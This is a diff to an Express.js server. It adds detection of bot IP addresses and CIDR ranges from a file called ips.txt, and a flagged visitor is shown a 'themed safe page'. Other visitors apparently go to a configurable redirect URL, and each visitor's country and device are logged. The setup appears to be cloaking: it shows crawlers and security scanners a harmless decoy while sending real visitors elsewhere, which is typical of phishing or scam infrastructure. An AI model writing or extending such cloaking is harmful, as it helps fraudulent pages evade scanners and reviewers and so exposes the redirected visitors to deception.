@@ -3,6 +3,7 @@ const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
 const path = require('path');
 const bodyParser = require('body-parser');
+const fs = require('fs');
 require('dotenv').config();
 
 const db = require('./database');
@@ -34,6 +35,74 @@ app.use(generateCSRFToken);
 app.use(logAdminActivity);
 
 db.initDatabase().catch(console.error);
+
+// Load bot IPs from file
+let botIPs = [];
+let botCIDRs = [];
+
+const loadBotIPs = () => {
+  try {
+    const data = fs.readFileSync(path.join(__dirname, 'ips.txt'), 'utf8');
+    const lines = data.split('\n').map(line => line.trim()).filter(line => line);
+    
+    lines.forEach(line => {
+      if (line.includes('/')) {
+        // CIDR block
+        botCIDRs.push(line);
+      } else {
+        // Single IP
+        botIPs.push(line);
+      }
+    });
+    
+    console.log(`Loaded ${botIPs.length} bot IPs and ${botCIDRs.length} CIDR blocks from ips.txt`);
+  } catch (error) {
+    console.error('Error loading bot IPs:', error);
+  }
+};
+
+// Function to check if IP is in CIDR range
+const ipInCIDR = (ip, cidr) => {
+  try {
+    const [network, prefixLength] = cidr.split('/');
+    const prefix = parseInt(prefixLength, 10);
+    
+    // Convert IPs to integers for comparison
+    const ipToInt = (ip) => {
+      return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
+    };
+    
+    const ipInt = ipToInt(ip);
+    const networkInt = ipToInt(network);
+    const mask = (-1 << (32 - prefix)) >>> 0;
+    
+    return (ipInt & mask) === (networkInt & mask);
+  } catch (error) {
+    return false;
+  }
+};
+
+// Function to check if IP is a bot IP
+const isBotIP = (ip) => {
+  // Check single IPs
+  if (botIPs.includes(ip)) {
+    return true;
+  }
+  
+  // Check CIDR ranges (only IPv4 for now)
+  if (ip.includes('.') && !ip.includes(':')) {
+    for (const cidr of botCIDRs) {
+      if (cidr.includes('.') && ipInCIDR(ip, cidr)) {
+        return true;
+      }
+    }
+  }
+  
+  return false;
+};
+
+// Load bot IPs on startup
+loadBotIPs();
 
 const detectBot = (userAgent) => {
   const botPatterns = [
@@ -113,16 +182,18 @@ app.use((req, res, next) => {
   const country = detectCountry(clientIp);
   const isBot = detectBot(userAgent);
   const isMobile = detectMobile(userAgent);
+  const isBotByIP = isBotIP(clientIp);
   
   req.visitorInfo = {
     ip: clientIp,
     country: country,
-    isBot: isBot,
+    isBot: isBot || isBotByIP, // Bot if either user-agent or IP matches
     isMobile: isMobile,
-    userAgent: userAgent
+    userAgent: userAgent,
+    isBotByIP: isBotByIP
   };
   
-  console.log(`[${new Date().toISOString()}] IP: ${clientIp}, Country: ${country}, Bot: ${isBot}, Mobile: ${isMobile}, UA: ${userAgent.substring(0, 50)}...`);
+  console.log(`[${new Date().toISOString()}] IP: ${clientIp}, Country: ${country}, Bot: ${isBot}, BotByIP: ${isBotByIP}, Mobile: ${isMobile}, UA: ${userAgent.substring(0, 50)}...`);
   
   next();
 });
@@ -130,10 +201,11 @@ app.use((req, res, next) => {
 app.use(express.static('public'));
 
 app.get('/', async (req, res) => {
-  const { isBot, country, isMobile, ip, userAgent } = req.visitorInfo;
+  const { isBot, country, isMobile, ip, userAgent, isBotByIP } = req.visitorInfo;
   
   if (isBot) {
-    console.log('Bot detected - showing themed safe page');
+    const detectMethod = isBotByIP ? 'IP-based' : 'User-Agent-based';
+    console.log(`Bot detected (${detectMethod}) - showing themed safe page`);
     const activeConfig = await db.getActiveRedirectUrl();
     const theme = activeConfig.theme || 'business';
     db.logVisitor({ ip, country, userAgent, isBot, isMobile, action: 'bot_page_shown' });
